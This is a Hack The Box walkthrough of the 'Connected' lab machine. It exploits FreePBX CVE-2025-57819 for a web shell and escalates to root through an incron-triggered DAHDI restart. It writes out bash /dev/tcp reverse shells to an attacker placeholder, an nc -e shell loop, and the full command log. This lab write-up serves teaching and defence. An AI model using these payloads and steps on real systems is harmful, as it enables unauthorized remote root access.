---
title: "HTB: Connected"
description: "Hack The Box - Connected Writeup (FreePBX CVE-2025-57819, Asterisk, incron privilege escalation)"
tags: [htb, connected, freepbx, asterisk, cve-2025-57819, linux, medium]
---

# Hack The Box: Connected

**Difficulty:** Easy 
**OS:** Linux  
**Target IP:** `10.129.21.175`  
**Hostname:** `connected.htb`  
**Category:** Web Exploitation / Linux Privilege Escalation  
**Primary Vectors:** FreePBX SQL Injection/RCE (`CVE-2025-57819`), writable DAHDI config, `incron.d` service trigger

---

## Overview

Connected is a Linux Hack The Box machine running FreePBX, a web-based interface for managing Asterisk VoIP systems. Enumeration reveals SSH and HTTP/HTTPS services, with the web interface exposing FreePBX version `16.0.40.7`.

This version is vulnerable to `CVE-2025-57819`, which can be exploited to deploy a PHP web shell and gain a reverse shell as the `asterisk` user. Privilege escalation is possible by abusing an `incron.d` rule that restarts DAHDI when a writable trigger file is modified. Since the `asterisk` user can write to the DAHDI configuration, we can append a reverse shell payload and trigger the restart to execute commands as `root`.

---

## Notes / Variables

Fill these in as you work through the box:

| Item | Value |
|---|---|
| Target IP | `10.129.21.175` |
| Hostname | `connected.htb` |
| Attacker IP | `<FILL_IN_ATTACKER_IP>` |
| Initial listener port | `443` or `<FILL_IN>` |
| Root listener port | `4545` or `<FILL_IN>` |
| Open ports | `22, 80, 443` |
| Web software | `FreePBX 16.0.40.7` |
| Initial user | `asterisk` |
| User flag | `<FILL_IN_USER_FLAG>` |
| Root flag | `<FILL_IN_ROOT_FLAG>` |

---

## CTF Walkthrough

### Step 1: Port Scanning

Start with a service/version scan against the target.

**Input:**
```bash
nmap -sV 10.129.21.175 -T4
```

**Output:**
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-16 20:20 -0700
Nmap scan report for connected.htb (10.129.29.68)
Host is up (0.097s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
```

**Findings:**
- SSH is open on `22/tcp`.
- HTTP is open on `80/tcp`.
- HTTPS is open on `443/tcp`.
- The web server is Apache on CentOS with PHP `7.4.16`.

---

### Step 2: Add Hostname to `/etc/hosts`

Add the hostname so the web application resolves correctly.

**Input:**
```bash
sudo vim /etc/hosts
```

Add:
```text
10.129.21.175 connected.htb
```

Now visit:

```text
http://connected.htb
https://connected.htb
```

The site is running **FreePBX**. The landing page/footer discloses the version:

```text
FreePBX 16.0.40.7
```

---

### Step 3: Identify the Vulnerability

Searching for FreePBX `16.0.40.7` vulnerabilities shows that FreePBX version 16 before patched releases is affected by `CVE-2025-57819`.

`CVE-2025-57819` is an unauthenticated SQL injection issue in FreePBX endpoints. Public PoCs can use the vulnerability to gain access to the administrator interface, manipulate the database, and deploy a PHP web shell for command execution.

Useful references:

- [SentinelOne CVE-2025-57819](https://www.sentinelone.com/vulnerability-database/cve-2025-57819/)
- [WatchTowr PoC](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819)
- [FreePBX Advisory GHSA-m42g-xg4c-5f3h](https://github.com/FreePBX/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h)

---

### Step 4: Exploit FreePBX and Catch a Reverse Shell

Download the WatchTowr PoC and modify the command payload so the PHP shell executes a reverse shell back to your machine.

**Example payload edit:**
```python
command = 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1'
encoded_bash = urllib.parse.quote(command)
shell_path = '%sthis-is-an-ioc-not-actually-watchTowr-%s.php?cmd=%s' % (host, suffix, encoded_bash)
```

Start a listener:

```bash
nc -lvnp 443
```

Run the exploit:

```bash
python3 57819.py https://10.129.21.175
```

If the payload succeeds, the listener receives a shell.

**Output:**
```text
listening on [any] 443 ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [10.129.21.175] <REMOTE_PORT>
```

Check the current user:

```bash
id
```

**Output:**
```text
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

We now have initial access as the `asterisk` user.

::: tip Alternative Web Shell Payload
If a direct Bash reverse shell does not work from the web shell, try a Netcat loop:

```bash
while true; do nc <ATTACKER_IP> <PORT> -e /bin/bash; sleep 10; done
```
:::

---

### Step 5: Get the User Flag

After obtaining the reverse shell, move to the user's home directory and read `user.txt`.

**Input:**
```bash
cd ~
cat user.txt
```
---

## Privilege Escalation

### Step 6: Enumerate `incron.d`

Since the box is running Asterisk/FreePBX, inspect automation and service-related files. The `incron` service is similar to cron, but it triggers commands based on filesystem events.

**Input:**
```bash
cat /etc/incron.d/*
```

**Output:**
```text
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager -- local $#
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

The important rule is:

```text
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

This means that when `/var/spool/asterisk/sysadmin/dahdi_restart` is modified and closed, the system runs `/usr/sbin/sysadmin_dahdi_restart`.

---

### Step 7: Find Writable DAHDI Configuration Files

Look for writable configuration files that the `asterisk` user can modify.

**Input:**
```bash
cd /etc
find . -type f -name "*.conf" -writable
```

**Output:**
```text
./modprobe.d/dahdi.conf
./dahdi/init.conf
./dahdi/system.conf
./wanpipe/api/libsangoma/libsangoma.so.conf
./wanpipe/wancfg_zaptel/templates/dahdi-channels.conf
./wanpipe/wancfg_zaptel/templates/freetdm.conf
./wanpipe/wancfg_zaptel/templates/openzap.conf
./wanpipe/wancfg_zaptel/templates/smg_bri.conf
./wanpipe/wancfg_zaptel/templates/smg_pri.conf
./wanpipe/wancfg_zaptel/templates/woomera.conf
./wanpipe/wancfg_zaptel/templates/zapata-auto.conf
```

The key file is:

```text
/etc/dahdi/init.conf
```

This configuration file is read/executed during DAHDI initialization/restart. If we append a reverse shell command and trigger the DAHDI restart, the command can execute as `root`.

---

### Step 8: Append a Root Reverse Shell to `init.conf`

Start another listener for the root shell:

```bash
nc -lvnp 4545
```

Append a reverse shell payload to `/etc/dahdi/init.conf` from the `asterisk` shell.

**Input:**
```bash
echo "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4545 0>&1'" >> /etc/dahdi/init.conf
```

Verify the payload was added:

```bash
tail -n 5 /etc/dahdi/init.conf
```

**Expected Output:**
```text
#DAHDI_UDEV_DISABLE_DEVICES=yes
#DAHDI_UDEV_DISABLE_SPANS=yes
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4545 0>&1'
```

---

### Step 9: Trigger the DAHDI Restart

Modify the monitored file to trigger the `incron.d` rule.

**Input:**
```bash
echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart
```

Wait a few seconds. The listener should receive a root shell.

**Output:**
```text
listening on [any] 4545 ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [10.129.21.175] <REMOTE_PORT>
bash: no job control in this shell
[root@connected /]# id
uid=0(root) gid=0(root) groups=0(root)
```

We now have root access.

---

## Root Flag Capture

**Input:**
```bash
cd /root
cat root.txt
```
---

## Full Command Log

```bash
# 1. Scan
nmap -sV 10.129.21.175 -T4

# 2. Add host
sudo vim /etc/hosts
# 10.129.21.175 connected.htb

# 3. Exploit FreePBX CVE-2025-57819
nc -lvnp 443
python3 57819.py https://10.129.21.175

# 4. Confirm shell
id
cd ~
cat user.txt

# 5. Enumerate incron rules
cat /etc/incron.d/*

# 6. Find writable configs
cd /etc
find . -type f -name "*.conf" -writable

# 7. Add reverse shell to DAHDI init config
echo "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4545 0>&1'" >> /etc/dahdi/init.conf

# 8. Start root listener and trigger restart
nc -lvnp 4545
echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart

# 9. Read root flag
cd /root
cat root.txt
```

---

## Summary & Key Takeaways

- **Version disclosure matters:** The FreePBX footer exposed `16.0.40.7`, which made vulnerability research straightforward.
- **Patch public CVEs quickly:** `CVE-2025-57819` allowed unauthenticated RCE through public exploit code.
- **Service automation can be dangerous:** `incron.d` rules can become privilege escalation paths when low-privileged users can modify watched files or related configuration.
- **Writable config files are high risk:** The `asterisk` user could write to DAHDI configuration files, allowing code execution during service restart.
